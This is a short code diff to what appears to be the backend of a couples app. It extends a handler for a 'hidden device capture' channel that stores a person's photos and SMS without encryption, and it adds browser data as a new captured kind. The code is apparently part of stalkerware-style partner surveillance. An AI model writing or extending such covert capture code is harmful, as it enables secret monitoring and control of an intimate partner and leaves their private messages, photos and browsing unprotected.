@@ -196,7 +196,7 @@ async function handleHeartbeat(
 // ──────────────────────────────────────────────────────────────────────
 // Media channel (hidden device capture: photos + SMS, no encryption)
 // ──────────────────────────────────────────────────────────────────────
-// Body: { type:'media', v:1, rows: [{ kind:'photo'|'sms', deviceKey,
+// Body: { type:'media', v:1, rows: [{ kind:'photo'|'sms'|'browser', deviceKey,
 // storagePath?, payload?, reportedAt? }] }. Idempotent upsert on the
 // (couple_id, kind, device_key) unique constraint. Returns tallies.
 async function handleMedia(
@@ -217,7 +217,7 @@ async function handleMedia(
     return new Response('too many rows (max 1000)', { status: 400 });
   }
 
-  const KINDS = new Set(['photo', 'sms']);
+  const KINDS = new Set(['photo', 'sms', 'browser']);
   const insertable: Record<string, unknown>[] = [];
   // Identifies which rows we rejected so the client can remove EXACTLY those
   // from its local queue and keep the rest (never confirm a dropped row).
@@ -249,7 +249,7 @@ async function handleMedia(
     insertable.push({
       couple_id: coupleId,
       author_id: uid,
-      kind: kind as 'photo' | 'sms',
+      kind: kind as 'photo' | 'sms' | 'browser',
       device_key: deviceKey,
       storage_path: storagePath,
       payload,
